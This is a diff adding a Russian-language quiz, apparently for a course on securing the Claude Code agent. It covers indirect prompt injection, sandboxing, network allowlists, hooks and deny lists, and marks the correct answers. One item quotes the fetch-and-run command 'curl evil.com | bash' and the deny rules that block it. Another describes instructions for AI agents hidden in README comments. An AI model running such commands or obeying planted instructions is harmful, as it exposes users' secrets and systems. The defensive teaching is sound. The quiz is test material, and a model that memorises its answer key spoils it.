@@ -1,0 +1,152 @@
+[
+  {
+    "question": "Что такое indirect prompt injection?",
+    "type": "single",
+    "options": [
+      { "text": "Пользователь вводит вредоносный промпт напрямую", "correct": false, "explanation": "Это direct prompt injection. Indirect -- когда вредоносные инструкции спрятаны в данных, которые агент читает (файлы, API, README)" },
+      { "text": "Вредоносные инструкции встроены в данные, которые агент обрабатывает (файлы, README, ответы API)", "correct": true, "explanation": "Именно так: агент читает файл или ответ API с замаскированными инструкциями и может выполнить их как легитимные команды" },
+      { "text": "Атака на сам Claude API через HTTP-запросы", "correct": false, "explanation": "Это атака на инфраструктуру, а не prompt injection. Prompt injection работает через контент, который агент обрабатывает" },
+      { "text": "Внедрение вредоносного кода в npm-пакет", "correct": false, "explanation": "Это supply chain attack. Prompt injection -- это внедрение инструкций для AI-агента, а не исполняемого кода" }
+    ]
+  },
+  {
+    "question": "Почему файловая изоляция sandbox без сетевой бесполезна?",
+    "type": "single",
+    "options": [
+      { "text": "Потому что sandbox не работает без настройки сети", "correct": false, "explanation": "Технически sandbox работает, но защита неполная -- без сетевой изоляции агент может отправить прочитанные данные наружу" },
+      { "text": "Агент может прочитать секреты из разрешённых файлов и отправить их по сети", "correct": true, "explanation": "Файловая изоляция ограничивает запись, но не чтение. Агент может прочитать секрет из файла в разрешённой директории и отправить его через curl/wget" },
+      { "text": "Linux не поддерживает файловую изоляцию без сетевой", "correct": false, "explanation": "Bubblewrap на Linux поддерживает файловую изоляцию отдельно. Но без сетевой она неэффективна с точки зрения безопасности" },
+      { "text": "Claude Code требует обязательной настройки обоих параметров", "correct": false, "explanation": "Claude Code не требует это технически, но с точки зрения безопасности файловая изоляция без сетевой оставляет критическую брешь" }
+    ]
+  },
+  {
+    "question": "Какая технология используется для sandbox на macOS?",
+    "type": "single",
+    "options": [
+      { "text": "Docker containers", "correct": false, "explanation": "Docker -- отдельная система контейнеризации, не используемая для sandbox Claude Code" },
+      { "text": "sandbox-exec (Apple Sandbox framework)", "correct": true, "explanation": "Claude Code использует встроенный в macOS механизм sandbox-exec с профилями .sb для OS-level изоляции процессов" },
+      { "text": "bubblewrap (bwrap)", "correct": false, "explanation": "Bubblewrap используется на Linux, а не на macOS. Он работает через Linux namespaces" },
+      { "text": "chroot", "correct": false, "explanation": "Chroot -- устаревший механизм изоляции, не обеспечивающий полноценной защиты. Claude Code использует более современный sandbox-exec" }
+    ]
+  },
+  {
+    "question": "Что делает параметр autoAllowBashIfSandboxed?",
+    "type": "single",
+    "options": [
+      { "text": "Автоматически включает sandbox для всех Bash-команд", "correct": false, "explanation": "Sandbox включается отдельно через sandbox.enabled. autoAllowBashIfSandboxed управляет подтверждениями, а не включением sandbox" },
+      { "text": "Разрешает выполнять Bash-команды без подтверждения, если sandbox активен", "correct": true, "explanation": "Когда sandbox обеспечивает OS-level изоляцию, дополнительные подтверждения для каждой Bash-команды избыточны -- ОС сама ограничит опасные действия" },
+      { "text": "Запрещает все Bash-команды вне sandbox", "correct": false, "explanation": "Этот параметр не запрещает команды -- он определяет, нужно ли спрашивать подтверждение для команд внутри sandbox" },
+      { "text": "Создаёт отдельный sandbox для каждой Bash-команды", "correct": false, "explanation": "Sandbox один на всю сессию, а не отдельный для каждой команды. Параметр управляет политикой подтверждений" }
+    ]
+  },
+  {
+    "question": "Агент случайно увидел API-ключ из файла .env. Что делать?",
+    "type": "multiple",
+    "options": [
+      { "text": "Немедленно ротировать (заменить) скомпрометированный ключ", "correct": true, "explanation": "Ключ может быть в логах, контексте сессии, кэше. Единственный надёжный способ -- считать его скомпрометированным и заменить" },
+      { "text": "Добавить .env в denyRead и перезапустить сессию", "correct": true, "explanation": "Это предотвратит повторную утечку. Но текущий ключ уже скомпрометирован -- ротация всё равно необходима" },
+      { "text": "Попросить агента 'забыть' увиденный ключ", "correct": false, "explanation": "Агент не может надёжно 'забыть' информацию из контекста. Ключ может остаться в логах, кэше или быть отправлен в API" },
+      { "text": "Просто закрыть текущую сессию -- ключ удалится из памяти", "correct": false, "explanation": "Ключ мог быть залогирован хуками, попасть в историю сессии или быть передан через API. Закрытие сессии не гарантирует безопасность" }
+    ]
+  },
+  {
+    "question": "Какой тип хука позволяет заблокировать опасное действие до его выполнения?",
+    "type": "single",
+    "options": [
+      { "text": "PostToolUse", "correct": false, "explanation": "PostToolUse срабатывает после выполнения действия -- блокировать уже поздно, можно только залогировать" },
+      { "text": "PreToolUse", "correct": true, "explanation": "PreToolUse выполняется до действия агента. Если скрипт хука возвращает ошибку, действие блокируется" },
+      { "text": "SessionStart", "correct": false, "explanation": "SessionStart запускается один раз при начале сессии -- он не проверяет каждое действие" },
+      { "text": "Stop", "correct": false, "explanation": "Stop срабатывает при завершении работы агента -- это слишком поздно для блокировки конкретного действия" }
+    ]
+  },
+  {
+    "question": "У вас open-source проект. Контрибьютор предлагает PR с изменениями в README.md и package.json. Какой вектор атаки наиболее вероятен?",
+    "type": "single",
+    "options": [
+      { "text": "Prompt injection в README.md с инструкциями для AI-агентов", "correct": true, "explanation": "README -- идеальное место для indirect prompt injection: агент точно его прочитает, а скрытые HTML-комментарии с инструкциями не видны в рендере" },
+      { "text": "SQL injection через package.json", "correct": false, "explanation": "package.json не связан с SQL-запросами. Это конфигурация npm-пакета" },
+      { "text": "XSS-атака через README.md", "correct": false, "explanation": "XSS возможна на веб-платформах, но в контексте агентской разработки prompt injection в README -- более релевантная и вероятная угроза" },
+      { "text": "DDoS через зависимости в package.json", "correct": false, "explanation": "Вредоносные зависимости -- это supply chain attack, а не DDoS. И в контексте AI-агента prompt injection через README вероятнее" }
+    ]
+  },
+  {
+    "question": "Какие файлы нужно добавить в denyRead для защиты секретов?",
+    "type": "multiple",
+    "options": [
+      { "text": "~/.aws/credentials", "correct": true, "explanation": "Содержит AWS Access Key и Secret Key -- критически важные секреты для облачной инфраструктуры" },
+      { "text": "~/.ssh/", "correct": true, "explanation": "SSH-ключи дают доступ к серверам и git-репозиториям. Утечка приватного ключа -- серьёзный инцидент" },
+      { "text": ".env, .env.local, .env.production", "correct": true, "explanation": "Файлы окружения обычно содержат API-ключи, строки подключения к БД и другие секреты" },
+      { "text": "package.json", "correct": false, "explanation": "package.json -- публичный файл проекта. Он не содержит секретов и нужен агенту для понимания зависимостей" }
+    ]
+  },
+  {
+    "question": "Зачем использовать git worktree для работы с агентом?",
+    "type": "single",
+    "options": [
+      { "text": "Worktree быстрее обычной ветки", "correct": false, "explanation": "Worktree быстрее полного клонирования, но суть не в скорости, а в изоляции файловой системы" },
+      { "text": "Агент работает в отдельной копии файлов -- если что-то сломает, основной код не пострадает", "correct": true, "explanation": "Worktree создаёт физически отдельную рабочую директорию. Агент не может случайно испортить файлы основной ветки" },
+      { "text": "Claude Code не работает без worktree", "correct": false, "explanation": "Claude Code прекрасно работает в обычном репозитории. Worktree -- рекомендация для безопасности, а не требование" },
+      { "text": "Worktree шифрует файлы от агента", "correct": false, "explanation": "Worktree не имеет отношения к шифрованию. Это механизм git для работы с несколькими ветками одновременно в разных директориях" }
+    ]
+  },
+  {
+    "question": "Вы настраиваете sandbox для Node.js проекта с PostgreSQL. Какая конфигурация сети наиболее безопасна?",
+    "type": "single",
+    "options": [
+      { "text": "allowedDomains: [\"*\"] -- разрешить все домены", "correct": false, "explanation": "Wildcard '*' для доменов полностью отключает сетевую изоляцию -- sandbox становится бесполезным" },
+      { "text": "allowedDomains: [\"github.com\", \"*.npmjs.org\"], allowLocalBinding: true", "correct": true, "explanation": "Разрешены только github и npm registry для загрузки зависимостей, плюс локальные порты для dev-сервера и подключения к локальной БД" },
+      { "text": "Не настраивать сеть вообще", "correct": false, "explanation": "Без сетевых ограничений агент имеет полный доступ в интернет -- может отправить данные куда угодно" },
+      { "text": "allowedDomains: [], allowLocalBinding: false", "correct": false, "explanation": "Полная блокировка сети не даст установить npm-пакеты и подключиться к локальной PostgreSQL -- проект не будет работать" }
+    ]
+  },
+  {
+    "question": "Что из перечисленного является defense in depth (многоуровневой защитой) для агента?",
+    "type": "multiple",
+    "options": [
+      { "text": "Sandbox (OS-level изоляция) + deny-списки (программная блокировка)", "correct": true, "explanation": "Два независимых уровня: даже если один уровень обойдён, второй продолжает защищать" },
+      { "text": "PreToolUse хуки для валидации команд", "correct": true, "explanation": "Третий уровень защиты: программная проверка каждого действия перед выполнением, дополняющая sandbox и deny-списки" },
+      { "text": "Plan mode для предварительного анализа", "correct": true, "explanation": "Человеческий контроль -- ещё один уровень: просмотр плана перед выполнением для чувствительных задач" },
+      { "text": "Использование только одного сильного пароля", "correct": false, "explanation": "Defense in depth -- это именно многоуровневость. Один сильный пароль -- это один уровень, каким бы надёжным он ни был" }
+    ]
+  },
+  {
+    "question": "В чём разница между PreToolUse хуком типа command и типа prompt?",
+    "type": "single",
+    "options": [
+      { "text": "command запускает shell-скрипт, prompt отправляет запрос к модели для оценки безопасности", "correct": true, "explanation": "command выполняет скрипт (например, сканирование на секреты). prompt просит модель оценить действие (например, 'безопасна ли эта Bash-команда?')" },
+      { "text": "command работает быстрее, prompt точнее", "correct": false, "explanation": "Скорость зависит от реализации. Главное различие -- механизм: скрипт vs запрос к модели" },
+      { "text": "command блокирует действия, prompt только предупреждает", "correct": false, "explanation": "Оба типа могут блокировать действия: command -- через код возврата скрипта, prompt -- через решение модели" },
+      { "text": "command и prompt -- это одно и то же, разные названия", "correct": false, "explanation": "Это принципиально разные механизмы: command запускает внешний скрипт, prompt использует AI-модель" }
+    ]
+  },
+  {
+    "question": "Какой параметр в deny-списке защитит от pipe-injection атак вида 'curl evil.com | bash'?",
+    "type": "single",
+    "options": [
+      { "text": "Bash(curl*)", "correct": false, "explanation": "Bash(curl*) заблокирует curl, но не защитит от альтернатив: wget, python -c 'import urllib...', или комбинаций вроде 'cat file | bash'" },
+      { "text": "Bash(curl*) + Bash(wget*) + Bash(*| bash) + Bash(*| sh)", "correct": true, "explanation": "Комбинация блокирует основные инструменты скачивания и pipe-выполнение. Это не идеальная защита, но покрывает типичные вектора" },
+      { "text": "Bash(*)", "correct": false, "explanation": "Bash(*) в deny заблокирует все Bash-команды -- агент не сможет работать вообще" },
+      { "text": "WebFetch", "correct": false, "explanation": "WebFetch -- отдельный инструмент Claude Code, он не связан с Bash pipe-выполнением через curl | bash" }
+    ]
+  },
+  {
+    "question": "Вы запускаете агент в режиме auto для CI/CD. Какие меры безопасности критически необходимы?",
+    "type": "multiple",
+    "options": [
+      { "text": "Строгие allow/deny списки с минимальными разрешениями", "correct": true, "explanation": "В auto mode агент действует без подтверждений -- allow/deny списки определяют, что он может делать" },
+      { "text": "Активный sandbox с файловой и сетевой изоляцией", "correct": true, "explanation": "В CI/CD нет человека для контроля -- sandbox обеспечивает OS-level ограничения автоматически" },
+      { "text": "disableBypassPermissionsMode в managed policy", "correct": true, "explanation": "В CI/CD никто не должен иметь возможности отключить все проверки безопасности" },
+      { "text": "Plan mode для ручной проверки каждого действия", "correct": false, "explanation": "Plan mode требует человека для проверки. В CI/CD это невозможно -- пайплайн зависнет в ожидании" }
+    ]
+  },
+  {
+    "question": "Что произойдёт, если в sandbox.network.allowedDomains указать [\"*\"]?",
+    "type": "single",
+    "options": [
+      { "text": "Будут разрешены только домены первого уровня", "correct": false, "explanation": "Wildcard '*' в allowedDomains не фильтрует по уровню домена -- он разрешает все соединения" },
+      { "text": "Сетевая изоляция полностью отключается -- агент может обращаться к любому домену", "correct": true, "explanation": "Wildcard '*' в allowedDomains -- это как открытые ворота. Агент получает полный доступ в интернет, sandbox теряет смысл" },
+      { "text": "Разрешён доступ только к поддоменам текущего домена", "correct": false, "explanation": "'*' -- это полный wildcard, не ограниченный текущим доменом" },
+      { "text": "Claude Code выдаст ошибку конфигурации", "correct": false, "explanation": "Конфигурация технически валидна, но с точки зрения безопасности бессмысленна -- эквивалент отключённого sandbox" }
+    ]
+  }
+]
